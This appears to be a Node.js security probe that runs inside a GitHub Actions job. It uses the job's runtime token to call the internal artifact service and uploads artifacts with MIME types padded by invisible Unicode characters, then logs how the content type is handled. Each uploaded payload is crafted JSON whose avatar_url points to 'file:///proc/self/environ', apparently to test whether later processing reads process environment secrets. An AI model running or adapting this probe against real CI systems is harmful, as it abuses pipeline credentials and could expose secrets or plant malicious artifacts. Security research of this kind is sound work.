'use strict';

const crypto = require('node:crypto');
const SERVICE = '/twirp/github.actions.results.api.v1.ArtifactService/';

function context() {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const base = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64url'));
  const scope = payload.scp.split(' ').find((value) => value.startsWith('Actions.Results:'));
  const [, runId, jobId] = scope.split(':');
  return { token, base, runId, jobId };
}

async function rpc(ctx, method, fields) {
  const response = await fetch(ctx.base + SERVICE + method, {
    method: 'POST',
    headers: { Authorization: `Bearer ${ctx.token}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({ workflow_run_backend_id: ctx.runId,
      workflow_job_run_backend_id: ctx.jobId, ...fields }),
    signal: AbortSignal.timeout(20000),
  });
  const text = await response.text();
  let body = {};
  try { body = JSON.parse(text); } catch { body = { raw: text.slice(0, 200) }; }
  return { status: response.status, body };
}

function field(result, name) {
  return result.body[name] || result.body[name.replace(/_([a-z])/g, (_, c) => c.toUpperCase())] || null;
}

async function one(ctx, index, label, mime) {
  const name = `invisible-${index}-${Date.now()}.json`;
  const created = await rpc(ctx, 'CreateArtifact', { name, version: 7, mime_type: mime });
  const uploadUrl = field(created, 'signed_upload_url');
  const output = { label, codepoints: Array.from(mime, (c) => c.codePointAt(0).toString(16)).join(','),
    create: created.status, accepted: Boolean(uploadUrl),
    message: created.body.msg || created.body.message || created.body.code || '' };
  if (!uploadUrl) return output;
  const payload = Buffer.from('{"full_name":"invisible/probe","owner":{"login":"x","avatar_url":"file:///proc/self/environ"}}');
  const put = await fetch(uploadUrl, { method: 'PUT', headers: {
    'Content-Type': 'application/octet-stream', 'x-ms-blob-type': 'BlockBlob' }, body: payload });
  output.upload = put.status;
  const done = await rpc(ctx, 'FinalizeArtifact', { name, size: String(payload.length),
    hash: `sha256:${crypto.createHash('sha256').update(payload).digest('hex')}` });
  output.finalize = done.status;
  const signed = await rpc(ctx, 'GetSignedArtifactURL', { name });
  const downloadUrl = field(signed, 'signed_url');
  if (downloadUrl) {
    const rsct = new URL(downloadUrl).searchParams.get('rsct') || '';
    output.rsctCodepoints = Array.from(rsct, (c) => c.codePointAt(0).toString(16)).join(',');
    try {
      const get = await fetch(downloadUrl);
      output.get = get.status;
      output.contentTypeHex = Buffer.from(get.headers.get('content-type') || '', 'latin1').toString('hex');
    } catch (error) { output.getError = `${error.name}:${error.message}`; }
  }
  return output;
}

(async () => {
  const ctx = context();
  const cps = [
    0x0485, 0x1085, 0x1885, 0x1d185, 0x10f85, 0x16f85, 0xe0185,
    0xe011c, 0xe011d, 0xe011e, 0xe011f,
    0xe001c, 0xe001d, 0xe001e, 0xe001f, 0xe0085,
    0x200b, 0x200c, 0x200d, 0x2060, 0xfeff,
  ];
  const cases = [['baseline', 'application/json']];
  for (const cp of cps) {
    const char = String.fromCodePoint(cp);
    cases.push([`u${cp.toString(16)}-prefix`, char + 'application/json']);
    cases.push([`u${cp.toString(16)}-suffix`, 'application/json' + char]);
  }
  for (let index = 0; index < cases.length; index += 1) {
    try { console.log('INVISIBLE ' + JSON.stringify(await one(ctx, index, ...cases[index]))); }
    catch (error) { console.log('INVISIBLE ' + JSON.stringify({ label: cases[index][0],
      error: `${error.name}:${error.message}` })); }
  }
})().catch((error) => {
  console.error(error && error.stack || error);
  process.exitCode = 1;
});
